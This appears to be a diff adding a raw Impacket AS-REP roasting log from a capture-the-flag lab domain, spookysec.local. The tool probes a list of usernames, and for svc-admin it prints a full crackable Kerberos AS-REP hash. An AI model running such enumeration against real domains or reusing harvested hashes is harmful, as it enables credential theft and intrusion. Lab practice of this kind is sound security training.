@@ -1,0 +1,64 @@
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for james@spookysec.local[0m
+[-] User james@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin@spookysec.local[0m
+$krb5asrep$23$svc-admin@spookysec.local[0m@SPOOKYSEC.LOCAL:ddcb140bc29c3a225c14c413ad0c433d$a2884de152f7c8e8857f35c421ce4c82ce611d156f802c810e28d7d882cdae7d54aa295200cbf4993264f0dde231620c69dea8b6610bde3661823c4495e8735a721964afa10e96678da68f4c1e4be31ba63f102713972d6eeb889977ec1023340c8c24097e5f6d8443e8ec8a03cf39dd6329a49ff0bbe72fd88186e15542ff30376ec78cdb30c381cba87d50666f6ef835d79cb1e6a489aca468c1131b0804c2064995786f6aa555f5cfb65c2e9e0087c309b9e6f62323edd7e68afc71cc3d9317a376e0e4dd76b81e971f33a017f8f01604d2445c239620ac65b1f8e1f8dd33af772a0d9ec32e694d097d5e6d72401eb1d5
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for James@spookysec.local[0m
+[-] User James@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for robin@spookysec.local[0m
+[-] User robin@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for darkstar@spookysec.local[0m
+[-] User darkstar@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for administrator@spookysec.local[0m
+[-] User administrator@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for backup@spookysec.local[0m
+[-] User backup@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for paradox@spookysec.local[0m
+[-] User paradox@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for JAMES@spookysec.local[0m
+[-] User JAMES@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for Robin@spookysec.local[0m
+[-] User Robin@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for Administrator@spookysec.local[0m
+[-] User Administrator@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for Darkstar@spookysec.local[0m
+[-] User Darkstar@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for Paradox@spookysec.local[0m
+[-] User Paradox@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for DARKSTAR@spookysec.local[0m
+[-] User DARKSTAR@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for ori@spookysec.local[0m
+[-] User ori@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for ROBIN@spookysec.local[0m
+[-] User ROBIN@spookysec.local[0m doesn't have UF_DONT_REQUIRE_PREAUTH set
